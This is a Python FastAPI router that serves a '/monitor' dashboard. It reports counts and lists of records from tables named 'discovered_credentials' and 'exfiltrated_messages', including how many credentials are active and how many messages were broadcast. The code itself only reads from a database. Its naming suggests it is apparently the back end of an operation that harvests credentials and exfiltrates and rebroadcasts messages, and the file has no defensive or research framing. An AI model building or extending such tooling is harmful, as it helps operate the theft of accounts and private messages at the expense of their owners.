from fastapi import APIRouter, HTTPException, Query
from typing import List
from app.core.database import db
from app.schemas.models import CredentialOut, MessageOut, StatsOut

router = APIRouter(prefix="/monitor", tags=["Monitor"])

@router.get("/stats", response_model=StatsOut)
def get_stats():
    """Get system stats."""
    try:
        # Supabase-py 'count' is tricky depending on version. 
        # Using exact=True if supported or just len(). For massive tables this is bad.
        # But this is "simple" request logic.
        
        c_res = db.table("discovered_credentials").select("*", count="exact").execute()
        total_creds = c_res.count if c_res.count is not None else len(c_res.data)
        
        ca_res = db.table("discovered_credentials").select("*", count="exact").eq("status", "active").execute()
        active_creds = ca_res.count if ca_res.count is not None else len(ca_res.data)

        m_res = db.table("exfiltrated_messages").select("*", count="exact").execute()
        total_msgs = m_res.count if m_res.count is not None else len(m_res.data)

        b_res = db.table("exfiltrated_messages").select("*", count="exact").eq("is_broadcasted", True).execute()
        bc_msgs = b_res.count if b_res.count is not None else len(b_res.data)

        return StatsOut(
            credentials_total=total_creds,
            credentials_active=active_creds,
            messages_exfiltrated=total_msgs,
            messages_broadcasted=bc_msgs
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.get("/credentials", response_model=List[CredentialOut])
def list_credentials(limit: int = 100):
    try:
        res = db.table("discovered_credentials").select("*").order("created_at", desc=True).limit(limit).execute()
        return res.data
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.get("/messages", response_model=List[MessageOut])
def list_messages(limit: int = 100):
    try:
        res = db.table("exfiltrated_messages").select("*").order("created_at", desc=True).limit(limit).execute()
        return res.data
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
